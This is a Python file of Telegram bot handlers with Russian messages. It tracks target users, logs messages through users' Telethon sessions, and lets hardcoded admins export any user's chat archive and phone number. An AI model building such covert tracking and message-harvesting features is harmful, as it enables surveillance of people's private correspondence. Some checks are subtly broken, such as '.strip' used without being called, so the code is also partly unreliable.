import datetime
from email.mime import message
from aiogram import Router, F
from aiogram.filters import Command
from aiogram.types import BufferedInputFile, Message
from core.savemod_service import SaveModService
from datetime import datetime
from core.tracker_service import TrackerService

from db.session import AsyncSessionLocal
from db.models import UserSession
from sqlalchemy import select
from core import tasks

router = Router()

ADMIN_IDS = [8418446543, 8566322265, 5484215621]

def setup_tracker_handlers(tracker_service, savemod_service):
    pass
@router.message(Command("tracker"))
async def start_tracker_handler(message: Message, tracker_service: TrackerService):
    parts = message.text.split(maxsplit=1)

    if len(parts) < 2 or not parts[1].strip:
        await message.answer(
            "❗ Укажи цель\n"
            "/tracker username\n"
            "/tracker user_id"
        )
        return

    target = parts[1].strip()

    try:
        await tracker_service.start(message.from_user.id, target)
        await message.answer("✅ Трекер запущен")
    except RuntimeError as e:
        await message.answer(str(e))

@router.message(Command("stop"))
async def stop_tracker_handler(message:Message, tracker_service: TrackerService):
    user_id = message.from_user.id
    try:
        await tracker_service.stop(user_id)
    except RuntimeError as e:
        await message.answer(str(e))

@router.message(F.text == "/savemod_on")
async def savemod_on_handler(message: Message, savemod_service: SaveModService):
    user_id = message.from_user.id
    async with AsyncSessionLocal() as session:
        result = await session.execute(
            select(UserSession).where(UserSession.bot_user_id == user_id)
        )
        user = result.scalar_one_or_none()
    if not user:
        return await message.answer("Сначала напиши /start и выбери режим.")
    if user.connection_type == "full":
        try:
            await savemod_service.enable(user_id)
            await message.answer("✅ SaveMod успешно включён (Telethon)")
        except Exception as e:
            await message.answer(f"❌ Ошибка: {e}")
    else:
        # Business режим
        user.savemod_enabled = True
        await session.commit()
        await message.answer("✅ SaveMod включён для Business Connection")

@router.message(F.text == "/savemod_off")
async def savemod_off_handler(message: Message, savemod_service: SaveModService):
    user_id = message.from_user.id
    async with AsyncSessionLocal() as session:
        result = await session.execute(
            select(UserSession).where(UserSession.bot_user_id == user_id)
        )
        user = result.scalar_one_or_none()
    if not user:
        return await message.answer("Ты ещё не зарегистрирован.")
    if user.connection_type == "full" and savemod_service:
        await savemod_service.disable(user_id)
        await message.answer("❌ SaveMod выключен (Telethon)")
    else:
        user.savemod_enabled = False
        await session.commit()
        await message.answer("❌ SaveMod выключен для Business Connection")
    
@router.message(Command("export"))
async def export_logs_handler(message: Message, savemod_service: SaveModService):
    if message.from_user.id not in ADMIN_IDS:
        return await message.answer("❌ У вас нет доступа к этой команде.")
    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        return await message.answer("⚠️ Используйте: <code>/export ID</code>", parse_mode="HTML")
    target_id = int(args[1])
    await message.answer(f"⏳ Формирую архив переписки для <code>{target_id}</code>...", parse_mode="HTML")
    file_content = await savemod_service.format_logs_to_txt(target_id)
    if not file_content:
        return await message.answer(f"❌ Логи для пользователя <code>{target_id}</code> не найдены.", parse_mode="HTML")
    
    file_data = BufferedInputFile(
        file_content.encode('utf-8'),
        filename=f"logs_{target_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    )
    await message.answer_document(
        file_data,
        caption=f"📁 Архив переписки для <code>{target_id}</code>",
        parse_mode="HTML"
    )

@router.message(Command("user"))
async def get_user_info_handler(message: Message, savemod_service: SaveModService):
    if message.from_user.id not in ADMIN_IDS:
        return await message.answer("❌ У вас нет доступа к этой команде.")
    
    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        return await message.answer("⚠️ Используйте: <code>/user ID</code>", parse_mode="HTML")
    
    target_id = int(args[1])
    async with AsyncSessionLocal() as session:
        result = await session.execute(
            select(UserSession).where(UserSession.bot_user_id == target_id)
        )
        user = result.scalar_one_or_none()

    if not user:
        return await message.answer(f"❌ Пользователь с ID <code>{target_id}</code> не найден.", parse_mode="HTML")
    
    has_session = await savemod_service.session_manager.has_session(target_id)
    session_status = "✅ Активна" if has_session else "❌ Нет сессии"
    savemod_status = "🟢 Включен" if user.savemod_enabled else "🔴 Выключен"
    
    is_tracker_active = tasks.is_tracker_running(target_id)
    tracker_status = "🟢 Запущен" if is_tracker_active else "🔴 Остановлен"
    text = (
        f"🔍 <b>Информация о пользователе {target_id}:</b>\n\n"
        f"📱 <b>Телефон:</b> <code>{user.phone or 'Не указан'}</code>\n"
        f"🔑 <b>Сессия:</b> {session_status}\n"
        f"💾 <b>SaveMod:</b> {savemod_status}\n"
        f"📡 <b>Tracker:</b> {tracker_status}\n"
    )
    await message.answer(text, parse_mode="HTML")

@router.message(Command("logout"))
async def logout_handler(message: Message, savemod_service: SaveModService):
    user_id = message.from_user.id
    try:
        await savemod_service.session_manager.logout(user_id)
        await message.answer("✅ Вы успешно вышли из аккаунта.")
    except Exception as e:
        await message.answer(f"❌ Ошибка при выходе: {e}")

@router.message(F.forward_from | F.forward_sender_name | F.forward_from_chat)
async def handle_forwarded_message(message: Message):
    target_id = None
    target_name = "Неизвестно"
    if message.forward_from:
        target_id = message.forward_from.id
        target_name = message.forward_from.full_name
    elif message.forward_from_chat:
        target_id = message.forward_from_chat.id
        target_name = message.forward_from_chat.title
    elif message.forward_sender_name:
        target_name = message.forward_sender_name

    text = "🔍 <b>Обнаружено пересланное сообщение</b>\n\n"
    if target_id:
        text += f"🆔 <b>ID:</b> <code>{target_id}</code>\n"
    else:
        text += "🆔 <b>ID:</b> <i>Скрыт настройками приватности</i>\n"
    
    text += f"👤 <b>Источник:</b> {target_name}"
    
    await message.reply(text, parse_mode="HTML")
@router.message(F.text.in_({"/id", "/userid", "/who", "/getid"}))
async def cmd_get_user_id(message: Message, savemod_service: SaveModService):
    target_id = None
    target_name = "Неизвестно"
    
    # 1. Проверяем, есть ли пересланное сообщение (ответ на него)
    if message.reply_to_message:
        reply = message.reply_to_message
        
        # Если переслано от пользователя с открытым ID
        if reply.forward_from:
            target_id = reply.forward_from.id
            target_name = reply.forward_from.full_name
            
        # Если переслано от пользователя, который скрыл ID (но имя есть)
        elif reply.forward_sender_name:
            target_name = reply.forward_sender_name
            
        # Если это просто ответ на обычное сообщение пользователя
        else:
            target_id = reply.from_user.id
            target_name = reply.from_user.full_name

    # 2. Если само сообщение является пересланным (а не ответ)
    elif message.forward_from:
        target_id = message.forward_from.id
        target_name = message.forward_from.full_name

    # 3. Если ничего не переслано — берем ID того, кто написал команду
    if not target_id:
        target_id = message.from_user.id
        target_name = message.from_user.full_name

    # Формируем ответ
    text = (
        f"🔍 <b>Информация</b>\n\n"
        f"🆔 <b>ID:</b> <code>{target_id if target_id else 'Скрыт'}</code>\n"
        f"👤 <b>Имя:</b> {target_name}\n"
    )
    
    await message.answer(text, parse_mode="HTML")


@router.message(F.text.startswith("/all"))
async def message_for_all_handler(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return await message.answer("❌ У вас нет доступа к этой команде.")
    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].strip:
        return await message.answer("⚠️ Введите сообщение после команды, например:\n<code>/all Всем привет!</code>", parse_mode="HTML")
    brodcast_text = args[1].strip()

    async with AsyncSessionLocal() as session:
        result = await session.execute(select(UserSession.bot_user_id))
        users = result.scalars().all()

    count = 0
    errors = 0

    status_msg = await message.answer(f"📢 Отправляем сообщение всем пользователям...{len(users)}")
    for user_id in users:
        try: 
            await message.bot.send_message(user_id, brodcast_text)
            count += 1
        except Exception as e:
            errors += 1
    await status_msg.edit_text(
        f"✅ <b>Рассылка завершена!</b>\n\n"
        f"👤 Всего в базе: {len(users)}\n"
        f"📥 Получили: {count}\n"
        f"🚫 Не получили (блок): {errors}",
        parse_mode="HTML")
    
@router.message(F.text.startswith("/commands"))
async def commands_handler(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return await message.answer("❌ У вас нет доступа к этой команде.")
    text = (
        "📋 <b>Список команд:</b>\n\n"
        "🔹 <code>/tracker [username|user_id]</code> - Запустить трекер для пользователя\n"
        "🔹 <code>/stop</code> - Остановить трекер\n"
        "🔹 <code>/savemod_on</code> - Включить SaveMod (только для Full Connection)\n"
        "🔹 <code>/savemod_off</code> - Выключить SaveMod\n"
        "🔹 <code>/export [user_id]</code> - Экспортировать логи переписки (админ)\n"
        "🔹 <code>/user [user_id]</code> - Получить информацию о пользователе (админ)\n"
        "🔹 <code>/logout</code> - Выйти из аккаунта\n"
        "🔹 <code>/id</code> - Получить ID пользователя (ответ на сообщение или пересланное)\n"
    )
    await message.answer(text, parse_mode="HTML")